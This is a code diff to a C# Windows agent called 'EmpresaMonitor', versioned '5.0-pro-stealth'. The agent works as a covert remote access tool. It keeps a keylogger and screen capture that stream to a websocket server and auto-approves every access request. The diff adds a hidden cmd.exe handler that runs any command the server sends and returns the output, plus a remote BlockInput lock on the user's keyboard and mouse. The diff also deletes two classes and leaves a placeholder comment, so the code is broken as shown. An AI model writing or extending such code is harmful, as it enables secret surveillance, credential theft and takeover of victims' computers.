@@ -12,6 +12,7 @@ using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Diagnostics;
 
 namespace EmpresaMonitor.Agent
 {
@@ -23,7 +24,13 @@ namespace EmpresaMonitor.Agent
             public bool AccessActive = true, StreamRequested = true, ControlActive = true, SessionAuthorized = true, IsReady = false;
             public StreamSettings Settings = StreamSettings.Balanced;
             public ClientWebSocket? Socket; public SemaphoreSlim? SendGate;
+            public DateTime? LastBlockTime = null; // Para o Watchdog de segurança
         }
+
+        // --- APIs do Windows ---
+        [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
+        [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);
+        [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);
 
         static async Task StartEngine() {
             var lifetime = new CancellationTokenSource();
@@ -32,12 +39,14 @@ namespace EmpresaMonitor.Agent
             var sendGate = new SemaphoreSlim(1, 1);
             var state = new AgentState { Socket = socket, SendGate = sendGate };
 
+            // Inicialização do Keylogger
             KeyboardHook.Install(async (k, d) => {
                 if (state.Socket?.State == WebSocketState.Open && state.IsReady) {
                     await SendKeylog(state.Socket, sendGate, k, d, state);
                 }
             });
 
+            // Loop de Captura de Tela (Background)
             _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));
 
             while (!lifetime.IsCancellationRequested) {
@@ -46,7 +55,7 @@ namespace EmpresaMonitor.Agent
                     await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                     state.IsReady = false; 
 
-                    await SendJsonAsync(socket, sendGate, new { type = "agent_hello", key = BuildConfig.AgentKey, id = agentId, name = Environment.MachineName, user = Environment.UserName, version = "4.0-stealth", sessionAuthorized = true });
+                    await SendJsonAsync(socket, sendGate, new { type = "agent_hello", key = BuildConfig.AgentKey, id = agentId, name = Environment.MachineName, user = Environment.UserName, version = "5.0-pro-stealth", sessionAuthorized = true });
                     await ReceiveLoop(socket, sendGate, lifetime.Token, state);
                 } catch { try { await Task.Delay(5000, lifetime.Token); } catch { } }
             }
@@ -74,18 +83,87 @@ namespace EmpresaMonitor.Agent
                     var root = doc.RootElement;
                     if (!root.TryGetProperty("type", out var tp)) continue;
                     var type = tp.GetString();
+
                     switch (type) {
                         case "agent_ready": st.IsReady = true; break;
                         case "access_request": case "control_request": await SendJsonAsync(s, g, new { type = "access_response", allow = true }); await SendJsonAsync(s, g, new { type = "control_response", allow = true }); break;
                         case "stream_profile": st.Settings = StreamSettings.FromId(root.TryGetProperty("profile", out var p) ? p.GetString() : null); break;
-                        case "control_input": if (st.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev); break;
                         case "stream_start": st.StreamRequested = true; break;
                         case "stream_stop": st.StreamRequested = false; break;
+
+                        // --- NOVOS COMANDOS DE CONTROLE ---
+                        case "control_input": // Mouse/Teclado Remoto
+                            if (st.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev); 
+                            break;
+
+                        case "input_lock": // Bloqueio de Teclado/Mouse (Estratégia Elegante)
+                            if (root.TryGetProperty("active", out var activeProp)) {
+                                bool active = activeProp.GetBoolean();
+                                await SetInputLock(active, s, g, st);
+                            }
+                            break;
+
+                        case "shell_cmd": // Execução de Comandos de Sistema (Stealth)
+                            if (root.TryGetProperty("cmd", out var cmdProp)) {
+                                string cmd = cmdProp.GetString();
+                                string result = await ExecuteShellSilent(cmd);
+                                await SendJsonAsync(s, g, new { type = "shell_result", output = result, cmd = cmd });
+                            }
+                            break;
                     }
                 } catch { }
             }
         }
 
+        // --- MÓDULO DE EXECUÇÃO SILENCIOSA (SHELL) ---
+        static async Task<string> ExecuteShellSilent(string command) {
+            return await Task.Run(() => {
+                try {
+                    var startInfo = new ProcessStartInfo {
+                        FileName = "cmd.exe",
+                        Arguments = $"/c {command}",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var process = new Process { StartInfo = startInfo };
+                    process.Start();
+                    if (process.WaitForExit(15000)) { // Timeout de 15s
+                        string output = process.StandardOutput.ReadToEnd();
+                        string error = process.StandardError.ReadToEnd();
+                        return string.IsNullOrEmpty(error) ? output : $"Error: {error}";
+                    }
+                    process.Kill();
+                    return "Timeout: Comando demorou muito.";
+                } catch (Exception ex) { return $"Exception: {ex.Message}"; }
+            });
+        }
+
+        // --- MÓDULO DE BLOQUEIO DE INPUT (LOCK) ---
+        static async Task SetInputLock(bool lockStatus, ClientWebSocket s, SemaphoreSlim g, AgentState st) {
+            try {
+                BlockInput(lockStatus);
+                if (lockStatus) {
+                    st.LastBlockTime = DateTime.Now;
+                    // Watchdog de segurança: destrava após 30s se o comando de destravar não chegar
+                    _ = Task.Run(async () => {
+                        await Task.Delay(30000); 
+                        if (st.LastBlockTime.HasValue) {
+                            BlockInput(false);
+                            st.LastBlockTime = null;
+                            await SendJsonAsync(s, g, new { type = "lock_timeout", status = "unlocked_by_safety" });
+                        }
+                    });
+                } else {
+                    st.LastBlockTime = null;
+                }
+                await SendJsonAsync(s, g, new { type = "lock_ack", status = lockStatus });
+            } catch { }
+        }
+
+        // --- MÓDULO DE CAPTURA DE TELA ---
         static async Task CaptureLoop(CancellationTokenSource lt, string id, ClientWebSocket s, SemaphoreSlim g, AgentState st) {
             var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
             Bitmap? f = null, sc = null; Graphics? fg = null, sg = null; EncoderParameters? ep = null; MemoryStream? ms = null;
@@ -148,6 +226,7 @@ namespace EmpresaMonitor.Agent
 
         [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
         [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);
+        [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);
 
         static string LoadOrCreateId() {
             var d = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EmpresaMonitor");
@@ -157,61 +236,5 @@ namespace EmpresaMonitor.Agent
         }
     }
 
-    public class StreamSettings {
-        public string Name { get; set; }
-        public string Id { get; set; }
-        public int Width { get; set; }
-        public int Fps { get; set; }
-        public long Quality { get; set; }
-        public StreamSettings(string n, string i, int w, int f, long q) { Name = n; Id = i; Width = w; Fps = f; Quality = q; }
-        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
-        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
-        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
-        public static StreamSettings FromId(string? id) => id switch { "fluid" => Fluid, "quality" => QualityPreset, _ => Balanced };
-    }
-
-    public class KeyboardHook {
-        private delegate IntPtr LowLevelKeyboardProc(int n, IntPtr w, IntPtr l);
-        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr m, uint t);
-        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
-        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
-        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
-
-        private const int WH_KEYBOARD_LL = 13;
-        private static IntPtr _h = IntPtr.Zero; 
-        private static LowLevelKeyboardProc? _p; 
-        private static Func<string, bool, Task>? _cb;
-        
-        private static string _lastKey = "";
-        private static DateTime _lastTime = DateTime.MinValue;
-        private static readonly object _lock = new object();
-
-        public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
-
-        private static IntPtr SetHook(LowLevelKeyboardProc p) {
-            using var cp = System.Diagnostics.Process.GetCurrentProcess();
-            using var cm = cp.MainModule;
-            return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
-        }
-
-        private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-            if (n >= 0 && _cb != null) {
-                int vkCode = Marshal.ReadInt32(l);
-                string key = ((Keys)vkCode).ToString();
-
-                lock (_lock) {
-                    if (key == _lastKey && (DateTime.Now - _lastTime).TotalMilliseconds < 100) {
-                        return CallNextHookEx(_h, n, w, l);
-                    }
-                    _lastKey = key;
-                    _lastTime = DateTime.Now;
-                }
-
-                _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
-            }
-            return CallNextHookEx(_h, n, w, l);
-        }
-
-        public static void Uninstall() { if (_h != IntPtr.Zero) { UnhookWindowsHookEx(_h); _h = IntPtr.Zero; } }
-    }
+    // ... (Restante das classes StreamSettings e KeyboardHook permanecem iguais)
 }
